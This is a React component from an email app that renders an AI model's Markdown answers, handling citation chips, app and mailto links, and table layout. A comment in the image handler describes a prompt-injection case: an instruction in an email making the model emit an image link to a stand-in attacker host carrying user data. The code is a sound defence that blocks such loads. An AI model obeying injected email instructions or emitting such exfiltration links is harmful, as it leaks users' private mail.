// Assistant answers as Markdown (GFM: lists, tables, code, links). Raw HTML in the text is never
// rendered. `mailr-cite:n` links become numbered citation chips; other links open in a new tab.
// The server normalises the text (agent/present.py: ### and #### headings, tables set off), and
// headings render at modest sizes. A table is laid out for the space it has (present/tableLayout.ts):
// a table when it fits, else stacked cards (three or more columns) or a horizontally scrolling table.

import { Children, cloneElement, isValidElement, memo, useLayoutEffect, useRef, useState, type ReactElement, type ReactNode } from 'react'
import ReactMarkdown, { defaultUrlTransform, type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { appPathOf } from './ambroseNav'
import { CitationChip } from './CitationChip'
import { CITE_SCHEME, citeNumber, type Citation } from './citations'
import { tableLayout } from './present/tableLayout'
import { t } from '../../../i18n'
import { rehypeDirAuto } from '../../../lib/rehypeDirAuto'
import { isMailto } from '../../../lib/mailto'

function urlTransform(url: string): string {
  return url.startsWith(CITE_SCHEME) ? url : defaultUrlTransform(url)
}

/** The host an image link points at, for its label; model output may hold an invalid URL. */
export function hostOf(url: string): string {
  try {
    return new URL(url, typeof location === 'undefined' ? 'http://localhost/' : location.href).hostname || 'image'
  } catch {
    return 'image'
  }
}

interface HastNode {
  type: string
  tagName?: string
  value?: string
  children?: HastNode[]
}

function textOf(n: HastNode | undefined): string {
  if (!n) return ''
  if (n.type === 'text') return n.value ?? ''
  return (n.children ?? []).map(textOf).join('')
}

/** Header and body cell texts of a table element (hast). */
function cellsOf(table: HastNode | undefined): { header: string[]; rows: string[][] } {
  const rows: string[][] = []
  let header: string[] = []
  const walk = (n: HastNode, inHead: boolean) => {
    for (const c of n.children ?? []) {
      if (c.type !== 'element') continue
      if (c.tagName === 'thead') walk(c, true)
      else if (c.tagName === 'tbody') walk(c, false)
      else if (c.tagName === 'tr') {
        const cells = (c.children ?? []).filter((x) => x.type === 'element').map(textOf)
        if (inHead) header = cells
        else rows.push(cells)
      }
    }
  }
  if (table) walk(table, false)
  return { header, rows }
}

type WithChildren = ReactElement<{ children?: ReactNode }>

/** Each cell labelled with its column (`data-label`), for the stacked-card layout. */
function labelCells(children: ReactNode, header: string[]): ReactNode {
  return Children.map(children, (section) => {
    if (!isValidElement(section)) return section
    const rows = Children.map((section as WithChildren).props.children, (tr) => {
      if (!isValidElement(tr)) return tr
      const cells = Children.toArray((tr as WithChildren).props.children)
        .filter(isValidElement)
        .map((td, i) => cloneElement(td as ReactElement<Record<string, unknown>>, { 'data-label': header[i] ?? '' }))
      return cloneElement(tr as WithChildren, { children: cells })
    })
    return cloneElement(section as WithChildren, { children: rows })
  })
}

interface Props {
  text: string
  citations?: Citation[]
  onOpenCitation?: (c: Citation) => void
  /** Opens a link to one of mailr's own pages in the app (Ambrose's chat: ambroseNav.ts). Without it,
   *  every link opens in a new tab. */
  onOpenAppLink?: (path: string) => void
  /** The width to lay tables out for; measured from the element when not given. */
  width?: number
}

export const Markdown = memo(function Markdown({ text, citations = [], onOpenCitation, onOpenAppLink, width }: Props) {
  const ref = useRef<HTMLDivElement>(null)
  const [measured, setMeasured] = useState<number | null>(null)
  useLayoutEffect(() => {
    const el = ref.current
    if (!el || width != null || typeof ResizeObserver === 'undefined') return
    const ro = new ResizeObserver(() => setMeasured(el.clientWidth))
    ro.observe(el)
    setMeasured(el.clientWidth)
    return () => ro.disconnect()
  }, [width])
  const avail = width ?? measured ?? 800
  const byN = new Map(citations.map((c) => [c.n, c]))
  const components: Components = {
    a({ href, children }) {
      const n = citeNumber(href)
      if (n !== null) {
        const c = byN.get(n)
        return c ? <CitationChip c={c} onOpen={onOpenCitation} /> : null
      }
      const app = onOpenAppLink ? appPathOf(href) : null
      if (app) {
        return (
          <a href={app} data-app-link="" onClick={(e) => {
            // A modified click (new tab, new window) keeps the browser's own behaviour.
            if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return
            e.preventDefault()
            onOpenAppLink!(app)
          }}>
            {children}
          </a>
        )
      }
      // An address (a mailto: link, or an address GFM turned into one) opens a draft in mailr's
      // composer: the page-wide catch in features/compose/mailtoLinks.ts takes the click.
      if (isMailto(href)) return <a href={href} title={href.replace(/^mailto:/i, '').split('?')[0]} data-testid="md-mailto">{children}</a>
      return (
        <a href={href} target="_blank" rel="noopener noreferrer nofollow" title={href}>
          {children}
        </a>
      )
    },
    // Never load images from model output: an injected instruction in an email could make the
    // model emit ![](https://attacker/?data=...) and the browser would fetch it with no click.
    // Show the alt text as a link the user can choose to open instead.
    img({ src, alt }) {
      const url = typeof src === 'string' ? src : ''
      if (!url) return <span className="md-img-blocked">{alt || 'image'}</span>
      return (
        <a href={url} target="_blank" rel="noopener noreferrer nofollow" className="md-img-blocked" title={url}>
          {t('rail.assistant.markdown.image', { alt: alt || hostOf(url) })}
        </a>
      )
    },
    table({ node, children }) {
      const { header, rows } = cellsOf(node as unknown as HastNode)
      const layout = tableLayout(header, rows, avail)
      return (
        // A focusable region, so a table wider than the panel scrolls from the keyboard.
        <div className={`md-table ${layout}`} data-layout={layout} data-cols={header.length} role="region" aria-label={t('common.table')} tabIndex={0}>
          <table>{layout === 'cards' ? labelCells(children, header) : children}</table>
        </div>
      )
    },
  }
  return (
    <div className="md" ref={ref}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeDirAuto]} skipHtml urlTransform={urlTransform} components={components}>
        {text}
      </ReactMarkdown>
    </div>
  )
})
